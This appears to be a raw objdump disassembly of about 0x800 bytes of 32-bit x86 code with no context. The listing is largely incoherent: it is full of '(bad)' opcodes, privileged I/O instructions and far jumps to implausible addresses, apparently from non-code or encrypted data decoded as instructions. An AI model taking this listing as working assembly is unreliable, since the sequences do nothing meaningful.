  4022d1:	xor    al,0x4f
  4022d3:	neg    DWORD PTR [eax]
  4022d5:	ds jge 0x40226c
  4022d8:	cmp    edi,0x7449682f
  4022de:	inc    eax
  4022df:	or     cl,BYTE PTR [ebp+0x13]
  4022e2:	inc    edx
  4022e3:	push   ebx
  4022e4:	sar    BYTE PTR [esi-0x2327f225],0xf8
  4022eb:	fisubr DWORD PTR [esi+0x1f]
  4022ee:	cs jo  0x40234a
  4022f1:	mov    dh,0x3c
  4022f3:	imul   edi,DWORD PTR [esi],0x3f
  4022f6:	adc    eax,0x8989331d
  4022fb:	je     0x4022fe
  4022fd:	sti    
  4022fe:	push   0xd4872cfd
  402303:	pop    ebp
  402304:	(bad)  
  402305:	mov    edi,0xa44625dc
  40230a:	mov    ebx,ebx
  40230c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40230d:	fwait
  40230e:	dec    esp
  40230f:	and    DWORD PTR [eax-0x3250128],0x34ab05ef
  402319:	pop    es
  40231a:	mov    ds:0xa32b5da6,eax
  40231f:	dec    edi
  402320:	xchg   ebp,eax
  402321:	inc    esi
  402322:	in     al,dx
  402323:	std    
  402324:	jmp    0x402309
  402326:	xor    edi,DWORD PTR [eax+0x13]
  402329:	lahf   
  40232a:	lods   eax,DWORD PTR ds:[esi]
  40232b:	dec    eax
  40232c:	scas   al,BYTE PTR es:[edi]
  40232d:	xor    eax,0x653ed552
  402332:	sbb    eax,0x4e413b84
  402337:	outs   dx,DWORD PTR ds:[esi]
  402338:	sbb    eax,0x5fdcb2eb
  40233d:	pusha  
  40233e:	cmp    al,0x64
  402340:	and    DWORD PTR [ebx-0x2ddcc98c],ebx
  402346:	xchg   DWORD PTR [edi+0x10],esi
  402349:	je     0x40233b
  40234b:	cwde   
  40234c:	cli    
  40234d:	inc    edx
  40234e:	jb     0x4023b6
  402350:	adc    al,dh
  402352:	inc    ecx
  402353:	(bad)  
  402354:	sti    
  402355:	jbe    0x4022dc
  402357:	hlt    
  402358:	or     edi,DWORD PTR [ebx]
  40235a:	ficomp WORD PTR [edi+0x7b550538]
  402360:	cwde   
  402361:	add    DWORD PTR [ecx-0x2159bd4d],esi
  402367:	jo     0x4023dc
  402369:	inc    esi
  40236a:	or     bh,cl
  40236c:	mov    DWORD PTR [ecx-0x5a5db559],ebx
  402372:	xchg   ebx,eax
  402373:	(bad)  
  402374:	das    
  402375:	jae    0x4023c0
  402377:	cmp    DWORD PTR [ecx-0x74b0bf76],eax
  40237d:	xchg   edi,eax
  40237e:	gs stos BYTE PTR es:[edi],al
  402380:	ja     0x402388
  402382:	xchg   BYTE PTR [ebp+0x7838061f],bh
  402388:	scas   eax,DWORD PTR es:[edi]
  402389:	stc    
  40238a:	nop
  40238b:	mov    esi,ebp
  40238d:	inc    eax
  40238e:	cmp    ecx,esi
  402390:	adc    eax,0x5591cf50
  402395:	and    eax,0x4bc56210
  40239a:	ds scas eax,DWORD PTR es:[edi]
  40239c:	imul   eax,DWORD PTR [edx+eiz*4-0x36],0xffffffea
  4023a1:	add    edx,edx
  4023a3:	push   ebp
  4023a4:	lea    eax,[ecx+0x30]
  4023a7:	out    0xab,al
  4023a9:	mov    WORD PTR [eax+eax*1-0x63da906a],gs
  4023b0:	pop    esi
  4023b1:	jbe    0x40240e
  4023b3:	jns    0x4023bc
  4023b5:	inc    ebp
  4023b6:	loope  0x4023bd
  4023b8:	icebp  
  4023b9:	loope  0x40238c
  4023bb:	inc    eax
  4023bc:	(bad)  
  4023bd:	xor    dh,dh
  4023bf:	push   ebx
  4023c0:	lock jae 0x402391
  4023c3:	stc    
  4023c4:	and    dh,BYTE PTR [ebx-0x7ecf0d2f]
  4023ca:	shr    cl,0xa6
  4023cd:	inc    esp
  4023ce:	jg     0x4023a2
  4023d0:	js     0x402391
  4023d2:	cmp    esi,edx
  4023d4:	pop    ebp
  4023d5:	dec    esi
  4023d6:	addr16 call 0x111e2912
  4023dc:	add    ebp,DWORD PTR ds:0x39b62d73
  4023e2:	in     al,dx
  4023e3:	stos   DWORD PTR es:[edi],eax
  4023e4:	test   ah,bh
  4023e6:	and    edi,DWORD PTR [edx-0xb]
  4023e9:	in     al,dx
  4023ea:	psubusw mm0,QWORD PTR [eax+ecx*8+0x68f0b72]
  4023f2:	ret    0xb9d2
  4023f5:	ret    0xe971
  4023f8:	mov    esp,0x3f5597f4
  4023fd:	arpl   WORD PTR [ecx],dx
  4023ff:	mov    bh,0xa4
  402401:	jg     0x402400
  402403:	xchg   edx,eax
  402404:	(bad)  
  402405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402406:	sar    DWORD PTR [ecx-0x6e4dadaf],cl
  40240c:	push   ds
  40240d:	and    BYTE PTR [eax-0x592432d4],dh
  402413:	xor    BYTE PTR [edx+0xf],cl
  402416:	mov    edi,0xb8eaec45
  40241b:	mov    ah,0x39
  40241d:	pop    ecx
  40241e:	jp     0x402476
  402420:	xlat   BYTE PTR ds:[ebx]
  402421:	adc    bl,ch
  402423:	clc    
  402424:	xchg   esp,eax
  402425:	imul   esi,edi,0x14
  402428:	(bad)  
  402429:	xlat   BYTE PTR ds:[ebx]
  40242a:	imul   edi,DWORD PTR [edi+0x2714e4cd],0xffffffaf
  402431:	sbb    esp,DWORD PTR [edx]
  402433:	pop    es
  402434:	xchg   esp,eax
  402435:	pop    ss
  402436:	ins    BYTE PTR es:[edi],dx
  402437:	call   0xd2dc66db
  40243c:	clc    
  40243d:	mov    eax,0xafb5fadc
  402442:	or     eax,0xfaecbf20
  402447:	pop    eax
  402448:	ins    DWORD PTR es:[edi],dx
  402449:	imul   esp,DWORD PTR [ebx+0x5a5ea59c],0xffffffea
  402450:	dec    esi
  402451:	xor    al,0x69
  402453:	pop    ss
  402454:	hlt    
  402455:	xchg   BYTE PTR [esi],cl
  402457:	inc    edi
  402458:	cmp    eax,0x44b29d90
  40245d:	fimul  DWORD PTR [edi-0xf]
  402460:	lahf   
  402461:	(bad)  
  402462:	push   0x35
  402464:	cmp    DWORD PTR [ebx+0x46],ecx
  402467:	(bad)  
  402468:	sub    BYTE PTR [ebx],ah
  40246a:	push   ss
  40246b:	imul   edx,DWORD PTR [edx],0x74c3779e
  402471:	push   ds
  402472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402473:	push   eax
  402474:	sub    BYTE PTR [eax+0x3fe3110b],bl
  40247a:	aaa    
  40247b:	cwde   
  40247c:	cmovle ecx,DWORD PTR [ebx+eax*1]
  402480:	add    al,0xea
  402482:	xchg   DWORD PTR [edx-0x5d],ecx
  402485:	ror    DWORD PTR [esi],1
  402487:	inc    ebx
  402488:	fist   DWORD PTR [eax-0x61]
  40248b:	or     edx,DWORD PTR [eax-0x7c67dd04]
  402491:	mov    ebp,?
  402493:	or     esp,ebp
  402495:	sub    BYTE PTR [esi],bl
  402497:	jns    0x402500
  402499:	loope  0x402477
  40249b:	icebp  
  40249c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40249d:	jae    0x4024ee
  40249f:	jle    0x4024be
  4024a1:	out    dx,eax
  4024a2:	xchg   edi,eax
  4024a3:	jl     0x40245d
  4024a5:	sub    al,0xfc
  4024a7:	mov    ah,0x2a
  4024a9:	popf   
  4024aa:	cmp    BYTE PTR [edi-0x60],bl
  4024ad:	in     al,0xe0
  4024af:	in     al,dx
  4024b0:	jnp    0x40244d
  4024b2:	inc    esi
  4024b3:	icebp  
  4024b4:	sbb    eax,0xc0dab0d8
  4024b9:	mov    cl,0xb7
  4024bb:	loope  0x40245c
  4024bd:	outs   dx,BYTE PTR ds:[esi]
  4024be:	sbb    al,0x77
  4024c0:	ret    
  4024c1:	or     cl,BYTE PTR [edi+0x52]
  4024c4:	imul   ecx,DWORD PTR [edx+0x78dd4797],0xb
  4024cb:	into   
  4024cc:	sub    DWORD PTR [edi+0x21],esp
  4024cf:	popa   
  4024d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024d1:	dec    ecx
  4024d2:	jne    0x4024d1
  4024d4:	rcl    BYTE PTR [esi-0x5dbeddb4],0xfb
  4024db:	jmp    0x4024f8
  4024dd:	or     cl,BYTE PTR [ebx-0xc]
  4024e0:	fcmovnu st,st(4)
  4024e2:	int    0x4e
  4024e4:	mov    cl,0x76
  4024e6:	cli    
  4024e7:	mov    al,ds:0x461cf2af
  4024ec:	xchg   esi,eax
  4024ed:	add    ebp,DWORD PTR [ecx*1-0x3fe2bf3c]
  4024f4:	or     eax,0x49bf0eee
  4024f9:	ins    BYTE PTR es:[edi],dx
  4024fa:	imul   edx,DWORD PTR [eax],0xffffff81
  4024fd:	call   0x9420:0x96894dc9
  402504:	std    
  402505:	sub    eax,0x7cffc3c6
  40250a:	in     eax,0x1d
  40250c:	ja     0x402574
  40250e:	mov    bh,0xc5
  402510:	or     ah,bl
  402512:	sbb    ah,BYTE PTR [eax-0x11]
  402515:	cwde   
  402516:	fwait
  402517:	dec    eax
  402518:	cdq    
  402519:	pop    edi
  40251a:	(bad)  
  40251b:	cmp    bl,bl
  40251d:	sub    edi,DWORD PTR [esp+edi*1-0xb3032ff]
  402524:	mov    al,ds:0x3ad4927
  402529:	mov    BYTE PTR [esi-0x79733dbf],dh
  40252f:	rol    BYTE PTR [ebp-0x158b10dc],0xd3
  402536:	jnp    0x40257b
  402538:	sbb    dl,BYTE PTR [esi+0x46348c67]
  40253e:	outs   dx,DWORD PTR ds:[esi]
  40253f:	inc    ebx
  402540:	xchg   edx,eax
  402541:	sub    eax,0xf87ad7a0
  402546:	fwait
  402547:	jecxz  0x40256b
  402549:	repz jl 0x4025af
  40254c:	aas    
  40254d:	adc    ecx,DWORD PTR ds:0x5b3c58a7
  402553:	ins    BYTE PTR es:[edi],dx
  402554:	sub    bh,ah
  402556:	popa   
  402557:	sbb    esi,edx
  402559:	es ret 0x2409
  40255d:	jae    0x402556
  40255f:	pop    ecx
  402560:	jb     0x4024f8
  402562:	xor    DWORD PTR [ecx-0x49],edx
  402565:	jmp    0x40f5:0xb2583f24
  40256c:	std    
  40256d:	cld    
  40256e:	xchg   edi,eax
  40256f:	mov    al,0x1c
  402571:	repnz out 0x9e,eax
  402574:	test   BYTE PTR [edi],ah
  402576:	cmp    eax,0x2c00e9f
  40257b:	dec    eax
  40257c:	pop    esp
  40257d:	push   eax
  40257e:	dec    edi
  40257f:	jae    0x402566
  402581:	sbb    DWORD PTR [ebp+0x62cd8bd4],0x1c
  402588:	mov    ah,0x7b
  40258a:	sub    eax,DWORD PTR [ebx+0x3b]
  40258d:	jbe    0x402555
  40258f:	dec    edi
  402590:	add    BYTE PTR [ebx],0x5e
  402593:	and    eax,0x81e4c776
  402598:	pop    esp
  402599:	shl    DWORD PTR [eax-0x7a575703],cl
  40259f:	jb     0x402546
  4025a1:	jle    0x402526
  4025a3:	cmc    
  4025a4:	push   ecx
  4025a5:	mov    fs,WORD PTR [ebx+edx*1-0x5c5e6f81]
  4025ac:	push   esi
  4025ad:	ds push 0xb76d6551
  4025b3:	loop   0x402549
  4025b5:	add    ebx,DWORD PTR [ebp+0x2d]
  4025b8:	or     al,0x63
  4025ba:	or     DWORD PTR ss:[ecx-0x272fa827],edx
  4025c1:	rcl    BYTE PTR [ebp-0x2a],1
  4025c4:	inc    esi
  4025c5:	fimul  DWORD PTR [ebp+0x556effd4]
  4025cb:	mov    ecx,0xee445625
  4025d0:	xchg   ecx,eax
  4025d1:	inc    edx
  4025d2:	sahf   
  4025d3:	mov    WORD PTR [edx],?
  4025d5:	out    0xf7,al
  4025d7:	(bad)  
  4025d8:	(bad)
  4025db:	inc    ebp
  4025dc:	xadd   DWORD PTR ds:0x9955f4c3,ecx
  4025e3:	push   ss
  4025e4:	lahf   
  4025e5:	dec    ebp
  4025e6:	mov    ds:0xa963cadd,eax
  4025eb:	jno    0x402623
  4025ed:	test   eax,0xba5373a7
  4025f2:	enter  0x3463,0x55
  4025f6:	shl    ebx,1
  4025f8:	push   0x2e5cd15
  4025fd:	imul   edi,DWORD PTR [eax-0x49cb5dfa],0xffffffea
  402604:	and    al,0x9b
  402606:	in     eax,dx
  402607:	(bad)  
  402608:	adc    al,0xcc
  40260a:	push   ebx
  40260b:	mov    edi,DWORD PTR [edx+0x1f844f8f]
  402611:	mov    ds:0x19d05bf7,al
  402616:	add    BYTE PTR ds:0xa5bcbf98,cl
  40261c:	mov    ecx,esi
  40261e:	std    
  40261f:	add    al,0x48
  402621:	aad    0x1f
  402623:	adc    DWORD PTR [edx],edx
  402625:	adc    dl,cl
  402627:	dec    ebx
  402628:	lods   al,BYTE PTR ds:[esi]
  402629:	test   bl,dl
  40262b:	cmp    ebp,DWORD PTR [ecx-0x50]
  40262e:	call   0x92475cf8
  402633:	out    0xfd,al
  402635:	outs   dx,BYTE PTR ds:[esi]
  402636:	jmp    0x40263d
  402638:	add    BYTE PTR [edi+0x4a1644c0],dh
  40263e:	into   
  40263f:	(bad)  
  402640:	loope  0x4025c2
  402642:	adc    DWORD PTR [esi-0x29],edi
  402645:	fcom   DWORD PTR [edi+edx*2+0x29]
  402649:	dec    edi
  40264a:	xchg   esi,eax
  40264b:	inc    ebp
  40264c:	in     al,0x7b
  40264e:	jmpw   0x7ba3
  402652:	xchg   ebp,eax
  402653:	pop    ebp
  402654:	mov    cl,0x9b
  402656:	add    bl,BYTE PTR ds:0xecf581c7
  40265c:	jb     0x40261f
  40265e:	xor    BYTE PTR [edi],0x2e
  402661:	call   0x223d:0x8b5566bf
  402668:	and    al,0xbe
  40266a:	daa    
  40266b:	pop    edi
  40266c:	sbb    al,0xf
  40266e:	jge    0x402682
  402670:	sub    BYTE PTR [eax-0x1153d4e3],bl
  402676:	in     eax,0xe9
  402678:	inc    esp
  402679:	les    esi,FWORD PTR [ecx-0x23]
  40267c:	sti    
  40267d:	jno    0x402640
  40267f:	lock mov edi,0x410356b2
  402685:	or     eax,0x33b2ea66
  40268a:	js     0x40269a
  40268c:	and    esp,DWORD PTR [ecx-0x6fe66de3]
  402692:	sbb    BYTE PTR [edi-0x4a],ch
  402695:	nop
  402696:	not    DWORD PTR [ebp+0x44]
  402699:	push   ecx
  40269a:	mov    ds:0x9d836086,al
  40269f:	cwde   
  4026a0:	xchg   dh,bl
  4026a2:	push   0x5702a02b
  4026a7:	push   ds
  4026a8:	jle    0x402698
  4026aa:	mov    ah,0x18
  4026ac:	mov    edi,0x684a272e
  4026b1:	inc    edi
  4026b2:	test   DWORD PTR [edx],esp
  4026b4:	push   es
  4026b5:	shl    edx,cl
  4026b7:	into   
  4026b8:	(bad)  
  4026b9:	ja     0x40265b
  4026bb:	cmp    ebp,DWORD PTR [eax]
  4026bd:	lods   al,BYTE PTR ds:[esi]
  4026be:	and    edi,DWORD PTR [esi+0x52e44069]
  4026c4:	push   es
  4026c5:	mov    ebx,0x1b8401c1
  4026ca:	mov    bl,0x69
  4026cc:	loopne 0x40266b
  4026ce:	xor    esp,esp
  4026d0:	cmovbe eax,DWORD PTR [edx]
  4026d3:	sub    BYTE PTR [eax-0x6f],dl
  4026d6:	jmp    0x9124ce31
  4026db:	add    edx,edi
  4026dd:	cli    
  4026de:	mov    eax,0xbb47c2ba
  4026e3:	and    edx,esp
  4026e5:	and    al,0xc8
  4026e7:	push   ecx
  4026e8:	push   0x5f
  4026ea:	mov    ds:0x7609fff8,al
  4026ef:	cwde   
  4026f0:	xor    BYTE PTR [edi],bh
  4026f2:	xchg   edi,eax
  4026f3:	ret    0xb3b
  4026f6:	call   0xb649:0x3f8025fb
  4026fd:	fs (bad) 
  4026ff:	jnp    0x40277c
  402701:	mov    eax,0x6ab61c71
  402706:	addr16 aas 
  402708:	inc    ebp
  402709:	clc    
  40270a:	pop    ds
  40270b:	inc    edx
  40270c:	adc    DWORD PTR [ebx+0x54daebb9],edx
  402712:	rcl    BYTE PTR [edx+ecx*1+0x5],1
  402716:	mov    ebx,0x8e184ced
  40271b:	pop    edi
  40271c:	mov    esp,0x594b1eb
  402721:	cmp    DWORD PTR [ecx],ebp
  402723:	fcmovnb st,st(7)
  402725:	ret    0xf19b
  402728:	push   0xffffffa7
  40272a:	cli    
  40272b:	mov    bh,0x72
  40272d:	ds icebp 
  40272f:	xor    BYTE PTR [edi],ah
  402731:	(bad)  
  402732:	jns    0x40275e
  402734:	scas   eax,DWORD PTR es:[edi]
  402735:	xchg   ecx,eax
  402736:	aad    0x9d
  402738:	frstor [eax+0x28]
  40273b:	js     0x40274f
  40273d:	jmp    0x40272b
  40273f:	pop    es
  402740:	push   edx
  402741:	pop    ds
  402742:	add    al,0xe6
  402744:	je     0x4026ef
  402746:	(bad)  
  402747:	int    0x8e
  402749:	ss mov al,0x65
  40274c:	mov    ebp,edx
  40274e:	aaa    
  40274f:	jecxz  0x4027c6
  402751:	and    DWORD PTR es:[ebx-0x36],edi
  402755:	pop    edx
  402756:	or     ah,BYTE PTR [eax+edi*8-0x96f310]
  40275d:	mov    ebp,DWORD PTR [eax+0x732a3869]
  402763:	dec    ebx
  402764:	aas    
  402765:	cli    
  402766:	add    DWORD PTR [esi],ebx
  402768:	sahf   
  402769:	inc    edi
  40276a:	inc    eax
  40276b:	addr16 mov ds:0x7ebe,al
  40276f:	jae    0x402750
  402771:	lods   eax,DWORD PTR ds:[esi]
  402772:	stc    
  402773:	shl    edx,1
  402775:	(bad)  
  402776:	mov    ecx,0x79792bad
  40277b:	mov    DWORD PTR [edi+0x77597b60],esi
  402781:	into   
  402782:	jecxz  0x402767
  402784:	aas    
  402785:	mov    dh,cl
  402787:	or     al,0x80
  402789:	xchg   edi,eax
  40278a:	in     eax,0xe3
  40278c:	and    eax,0xbab9803c
  402791:	mov    edi,0x4f177621
  402796:	bound  esi,QWORD PTR [esi-0xbf3c0c]
  40279c:	ret    0x1643
  40279f:	sbb    DWORD PTR [edi+edi*4+0x202b5c61],0xffffffcf
  4027a7:	gs nop
  4027a9:	sbb    al,0xda
  4027ab:	aam    0x9
  4027ad:	pop    esi
  4027ae:	adc    eax,0xd9c85f6e
  4027b3:	sti    
  4027b4:	push   es
  4027b5:	mov    ebp,0x16ac0a7c
  4027ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027bb:	bound  edi,QWORD PTR [ebx+0x7f7eb74b]
  4027c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027c2:	sbb    BYTE PTR [eax+ebx*2-0x8ab2b12],dh
  4027c9:	mov    ds:0x73fb4e7d,eax
  4027ce:	data16 xor BYTE PTR [edi-0x71791643],0xab
  4027d6:	or     cl,BYTE PTR [ebp-0x7f]
  4027d9:	and    BYTE PTR [ecx+0x3f],bl
  4027dc:	loope  0x4027d6
  4027de:	ficom  DWORD PTR [edx-0x379e4b7c]
  4027e4:	fistp  QWORD PTR [edx+0x6b]
  4027e8:	leave  
  4027e9:	sub    DWORD PTR [eax-0x5b],edi
  4027ec:	sub    al,0xc1
  4027ee:	dec    ecx
  4027ef:	lea    ecx,[eax-0x64db3160]
  4027f5:	retf   0x5693
  4027f8:	cmp    dl,dl
  4027fa:	xor    eax,0x1d08d6d1
  4027ff:	or     bh,BYTE PTR [eax]
  402801:	adc    ah,al
  402803:	inc    edx
  402804:	push   0x2029fcf2
  402809:	rcl    BYTE PTR [edx+0x11],0xd8
  40280d:	data16 add al,0x67
  402810:	js     0x40279c
  402812:	dec    edi
  402813:	fwait
  402814:	test   cl,al
  402816:	loope  0x4027d4
  402818:	fstp   QWORD PTR [edx+0x34101e8b]
  40281e:	sbb    bl,BYTE PTR [edi-0x73]
  402821:	mov    bl,0x2
  402823:	xchg   esp,eax
  402824:	sub    ebx,esp
  402826:	cdq    
  402827:	lods   al,BYTE PTR ds:[esi]
  402828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402829:	xchg   esi,eax
  40282a:	scas   al,BYTE PTR es:[edi]
  40282b:	(bad)  
  40282c:	fs dec edi
  40282e:	sub    ch,dh
  402830:	icebp  
  402831:	xchg   BYTE PTR [ebp+0x73],ch
  402834:	hlt    
  402835:	cwde   
  402836:	mov    eax,ds:0x2c85f34f
  40283b:	mov    ecx,0xc15ab20c
  402840:	js     0x402818
  402842:	mov    esp,0x8a8e19a6
  402847:	aaa    
  402848:	test   BYTE PTR [ebp+0x17],dl
  40284b:	aas    
  40284c:	xchg   esp,eax
  40284d:	sub    DWORD PTR [ebp+0x137bc961],ebp
  402853:	mov    gs,WORD PTR [ebp+0x50]
  402856:	xlat   BYTE PTR ds:[ebx]
  402857:	jmp    0x65d7eda9
  40285c:	or     BYTE PTR [eax+0x659fbc1a],ah
  402862:	rcr    BYTE PTR [ebp+0x52e6fc66],cl
  402868:	scas   eax,DWORD PTR es:[edi]
  402869:	retf   0xde9f
  40286c:	inc    ebp
  40286d:	mov    bh,0x15
  40286f:	xchg   DWORD PTR [ebp+0x34],ecx
  402872:	lea    ebx,[ecx]
  402874:	push   es
  402875:	icebp  
  402876:	cmp    ebp,edx
  402878:	push   0x5c
  40287a:	ins    DWORD PTR es:[edi],dx
  40287b:	shl    DWORD PTR [esp+edx*8],cl
  40287e:	xchg   esp,eax
  40287f:	xchg   ebp,eax
  402880:	mov    ah,0xbb
  402882:	xlat   BYTE PTR ds:[ebx]
  402883:	(bad)  
  402884:	mov    bh,0x77
  402886:	jmp    0x402899
  402888:	pop    ss
  402889:	xchg   edi,eax
  40288a:	jns    0x4028d8
  40288c:	aaa    
  40288d:	sbb    ebp,ecx
  40288f:	and    DWORD PTR [ebp+0x3],0xffffffe2
  402893:	aad    0x8e
  402895:	hlt    
  402896:	and    al,0xda
  402898:	mov    edx,0x70e56912
  40289d:	ja     0x4028a3
  40289f:	dec    edx
  4028a0:	sahf   
  4028a1:	cwde   
  4028a2:	sbb    ebx,DWORD PTR [ecx]
  4028a4:	adc    ecx,esp
  4028a6:	enter  0x1350,0x36
  4028aa:	retf   0xc2ef
  4028ad:	mov    bh,0xf0
  4028af:	mov    ebp,0x20bafe5a
  4028b4:	and    al,0xf4
  4028b6:	scas   al,BYTE PTR es:[edi]
  4028b7:	jmp    0xc85e9e73
  4028bc:	bound  esi,QWORD PTR [ebp-0x5a5e16fa]
  4028c2:	out    0x5d,eax
  4028c4:	mov    ch,0xcb
  4028c6:	xchg   DWORD PTR [ebx+0xc],ecx
  4028c9:	outs   dx,BYTE PTR ds:[esi]
  4028ca:	jno    0x4028f4
  4028cc:	out    dx,eax
  4028cd:	inc    esi
  4028ce:	std    
  4028cf:	imul   DWORD PTR [eax-0x7d]
  4028d2:	cmp    eax,0x89b83508
  4028d7:	sbb    al,0x67
  4028d9:	jl     0x4028e6
  4028db:	movaps xmm0,xmm2
  4028de:	cmp    BYTE PTR [edx+ecx*4],bh
  4028e1:	les    esp,FWORD PTR [ebp+edi*8-0x50f6736]
  4028e8:	sar    esi,0x8a
  4028eb:	enter  0x8687,0xd9
  4028ef:	sbb    dh,BYTE PTR [ebx]
  4028f1:	mov    ecx,0xca9eb85b
  4028f6:	pop    es
  4028f7:	fsubp  st(2),st
  4028f9:	stos   DWORD PTR es:[edi],eax
  4028fa:	push   ds
  4028fb:	xchg   ecx,eax
  4028fc:	adc    eax,0xc433a7b
  402901:	mov    bh,0x52
  402903:	int3   
  402904:	loopne 0x4028db
  402906:	rcl    BYTE PTR [ebp+0x49],0x72
  40290a:	adc    cl,BYTE PTR [edi]
  40290c:	add    BYTE PTR ds:0xc6ae659f,0xa6
  402913:	inc    edx
  402914:	push   eax
  402915:	push   eax
  402916:	adc    al,0xd8
  402918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402919:	jno    0x4028d7
  40291b:	push   ecx
  40291c:	icebp  
  40291d:	ja     0x4028bc
  40291f:	push   es
  402920:	mov    edx,0xcc88e7b5
  402925:	jb     0x402945
  402927:	clc    
  402928:	pop    ds
  402929:	arpl   WORD PTR [esi],ax
  40292b:	inc    ecx
  40292c:	repnz aas 
  40292e:	sub    bl,BYTE PTR [ebx+0x3a]
  402931:	jl     0x402982
  402933:	mov    esi,DWORD PTR [esi]
  402935:	mov    edi,0x6ccc0550
  40293a:	mov    eax,0x6f8bff78
  40293f:	adc    eax,0xecb4fecb
  402944:	rcr    DWORD PTR [ebp+0x502ba8c6],1
  40294a:	add    BYTE PTR [ebp-0x47bed2f],0xa1
  402951:	test   ecx,esi
  402953:	ret    0x98a5
  402956:	sub    BYTE PTR [esi+ebp*8-0x6078bb5f],dl
  40295d:	and    dh,BYTE PTR [ecx+0x8]
  402960:	rol    BYTE PTR [edi+0x2b8595e9],0x8a
  402967:	xchg   DWORD PTR [edi],eax
  402969:	add    BYTE PTR ds:0x714eb95d,al
  40296f:	sbb    DWORD PTR [ecx+0x54],0xf369e709
  402976:	jl     0x4029dc
  402978:	push   ebx
  402979:	fwait
  40297a:	jl     0x40291f
  40297c:	mov    esp,esi
  40297e:	shl    DWORD PTR [ecx-0x75661e86],cl
  402984:	dec    esp
  402985:	add    DWORD PTR [ebx+0x61],0x4fbe349d
  40298c:	cli    
  40298d:	ss sbb al,0x13
  402990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402991:	mov    ?,WORD PTR [edx+0xd]
  402994:	jmp    0x5c974640
  402999:	dec    esp
  40299a:	xor    al,BYTE PTR [esp+edi*4]
  40299d:	jmp    0x697b:0x23a4f963
  4029a4:	jmp    0x402991
  4029a6:	inc    ecx
  4029a7:	xor    DWORD PTR [eax-0x12],esp
  4029aa:	jb     0x402a0b
  4029ac:	icebp  
  4029ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029ae:	jl     0x4029af
  4029b0:	mov    edx,0x5d776169
  4029b5:	xchg   ecx,eax
  4029b6:	inc    ecx
  4029b7:	mov    eax,0x92211fca
  4029bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029bd:	adc    esp,eax
  4029bf:	out    dx,al
  4029c0:	pushf  
  4029c1:	in     eax,0x35
  4029c3:	cli    
  4029c4:	pushf  
  4029c5:	mov    bh,0x3d
  4029c7:	pop    edx
  4029c8:	mov    bl,0x9c
  4029ca:	mov    ah,0xaa
  4029cc:	icebp  
  4029cd:	aaa    
  4029ce:	pop    eax
  4029cf:	pop    esi
  4029d0:	repnz mov eax,0xdad17260
  4029d6:	jbe    0x40297c
  4029d8:	mov    esp,0x2dc8628
  4029dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029de:	fnstcw WORD PTR [eax-0x66539fc]
  4029e4:	retf   0xa7bd
  4029e7:	fdivr  DWORD PTR [edi]
  4029e9:	pushf  
  4029ea:	add    eax,0xc4bbf3b7
  4029ef:	mov    WORD PTR [ebx+0x5b902508],gs
  4029f5:	and    DWORD PTR ds:0x17689693,ebx
  4029fb:	sahf   
  4029fc:	mov    dl,0x48
  4029fe:	fisttp QWORD PTR [eax-0xc]
  402a01:	xchg   ebx,eax
  402a02:	lahf   
  402a03:	fs call 0x8a6ca2a5
  402a09:	call   0x455671df
  402a0e:	or     al,0x31
  402a10:	mov    ecx,0xfb8c6bb2
  402a15:	push   edi
  402a16:	jb     0x4029d3
  402a18:	imul   BYTE PTR ds:0xb27fe16
  402a1e:	enter  0x6398,0x32
  402a22:	push   0x5b
  402a24:	mov    DWORD PTR [ecx-0xc3570b7],ecx
  402a2a:	dec    esi
  402a2b:	(bad)  
  402a2c:	fidiv  DWORD PTR [esi+0x797adb62]
  402a32:	scas   al,BYTE PTR es:[edi]
  402a33:	push   ebp
  402a34:	or     edx,edi
  402a36:	imul   esi,DWORD PTR [edx+eax*8+0x3ec9245],0xb6b46065
  402a41:	cmp    BYTE PTR [si+0x31],ah
  402a45:	push   es
  402a46:	or     DWORD PTR [ecx],0x25
  402a49:	jle    0x402ab4
  402a4b:	and    dl,ch
  402a4d:	jno    0x402a86
  402a4f:	nop
  402a50:	loopne 0x402a21
  402a52:	cs jge 0x4029fe
  402a55:	out    dx,eax
  402a56:	(bad)  
  402a57:	or     al,0x9c
  402a59:	pop    ebp
  402a5a:	inc    ecx
  402a5b:	lods   eax,DWORD PTR ds:[esi]
  402a5c:	mov    dl,0xe0
  402a5e:	xchg   ebp,eax
  402a5f:	bndldx bnd1,[ecx-0x7b]
  402a63:	arpl   WORD PTR [edi],sp
  402a65:	addr16 js 0x402a23
  402a68:	sti    
  402a69:	mov    edx,0x70fabaa1
  402a6e:	sbb    ah,BYTE PTR [ebx-0x3af27f60]
  402a74:	(bad)  
  402a75:	and    BYTE PTR [eax],ch
  402a77:	clc    
  402a78:	sbb    DWORD PTR [ebp-0x7f],esp
  402a7b:	pushf  
  402a7c:	jmp    0x92e5f1a3
  402a81:	test   al,0x69
  402a83:	adc    al,0x25
  402a85:	push   ecx
  402a86:	mov    eax,0x2a50932f
  402a8b:	dec    esp
  402a8c:	mov    ecx,0xecf2775f
  402a91:	(bad)  
  402a92:	push   ebp
  402a93:	push   esi
  402a94:	jl     0x402a4e
  402a96:	jbe    0x402a1e
  402a98:	pop    esp
  402a99:	out    0xc9,eax
  402a9b:	sahf   
  402a9c:	add    eax,0xd6bd2c71
  402aa1:	xchg   ebp,eax
  402aa2:	inc    edi
  402aa3:	fdiv   st,st(0)
  402aa5:	loop   0x402afe
  402aa7:	outs   dx,DWORD PTR ds:[esi]
  402aa8:	inc    edi
  402aa9:	push   edx
  402aaa:	mov    bl,0xa9
  402aac:	jle    0x402b1d
  402aae:	mov    eax,ds:0x2c95332c
  402ab3:	push   esi
  402ab4:	and    DWORD PTR [ebp+edx*2+0x41],ecx
  402ab8:	cmc    
  402ab9:	xchg   ecx,eax
  402aba:	xor    eax,0x32c46c10
  402abf:	sahf   
  402ac0:	bnd call 0xd400f82d
  402ac6:	pop    ebx
